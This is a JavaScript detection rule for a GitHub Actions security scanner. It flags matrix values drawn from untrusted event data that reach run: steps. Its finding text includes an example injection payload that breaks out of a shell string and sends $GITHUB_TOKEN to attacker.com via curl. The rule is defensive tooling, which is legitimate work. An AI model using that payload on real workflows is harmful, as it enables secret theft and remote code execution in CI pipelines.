import { getAllSteps, findLineNumber, extractSnippet } from '../yaml-parser.js';

const DANGEROUS_CONTEXTS = [
  'github.event.issue',
  'github.event.pull_request',
  'github.event.comment',
  'github.event.review',
  'github.event.discussion',
  'github.event.commits',
  'github.head_ref',
  'github.event.workflow_run',
];

function isExternalExpression(val) {
  if (typeof val !== 'string') return false;
  return DANGEROUS_CONTEXTS.some(ctx => val.includes(ctx));
}

function matrixFromExternalInput(matrix) {
  if (!matrix || typeof matrix !== 'object') return false;
  for (const val of Object.values(matrix)) {
    if (isExternalExpression(val)) return true;
    if (typeof val === 'string' && val.includes('fromJSON')) {
      if (DANGEROUS_CONTEXTS.some(ctx => val.includes(ctx))) return true;
    }
  }
  const include = matrix.include;
  if (Array.isArray(include)) {
    for (const item of include) {
      if (typeof item === 'object' && item !== null) {
        for (const v of Object.values(item)) {
          if (isExternalExpression(String(v ?? ''))) return true;
        }
      }
    }
  }
  return false;
}

export function checkMatrixInjection(workflow, rawContent, filename) {
  const findings = [];
  const jobs = workflow?.jobs ?? {};

  for (const [jobId, job] of Object.entries(jobs)) {
    const matrix = job?.strategy?.matrix;
    if (!matrixFromExternalInput(matrix)) continue;

    const steps = job.steps;
    if (!Array.isArray(steps)) continue;

    // Check if any step uses ${{ matrix.* }} in a run: block
    for (let stepIndex = 0; stepIndex < steps.length; stepIndex++) {
      const step = steps[stepIndex];
      const run = step.run;
      if (typeof run !== 'string') continue;
      if (!/\$\{\{\s*matrix\./.test(run)) continue;

      const lineNumber = findLineNumber(rawContent, 'matrix:');
      const snippet = extractSnippet(rawContent, lineNumber, 6);
      const jobName = job.name ?? jobId;

      findings.push({
        id:          `matrix-injection-${filename}-${jobId}-${stepIndex}`,
        rule:        'matrix-injection',
        severity:    'high',
        title:       'Matrix Strategy Populated from Untrusted Input Used in run: Step',
        file:        filename,
        line:        lineNumber,
        snippet,
        context:     `Job: \`${jobName}\`  ·  Step ${stepIndex + 1}${step.name ? ` (${step.name})` : ''}`,
        detail:      `The job's \`strategy.matrix\` is populated from attacker-controlled event data (e.g., \`fromJSON(github.event.*)\`). The matrix values are then interpolated via \`\${{ matrix.* }}\` into a \`run:\` step. Because matrix values are substituted before shell execution, the attacker controls arbitrary shell input in that step — this is functionally identical to direct template injection.`,
        exploit:     `An attacker crafts an event (PR body, issue, comment) containing a matrix value like \`"; curl https://attacker.com/exfil?t=$GITHUB_TOKEN #"\`. When the workflow expands \`\${{ matrix.target }}\` inside the run script, the attacker's payload executes, exfiltrating secrets.`,
        impact:      'Template Injection via Matrix → Remote Code Execution with Secret Access',
        remediation: `Never use external event data directly in \`strategy.matrix\`. Validate and allowlist matrix values before use, or avoid \`fromJSON()\` with untrusted input entirely. Pass matrix values through env vars and sanitize:\n\nenv:\n  TARGET: \${{ matrix.target }}\nrun: echo "Building $TARGET"`,
        cvss:        { score: 8.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N', cwe: 'CWE-94' },
      });
    }
  }

  return findings;
}
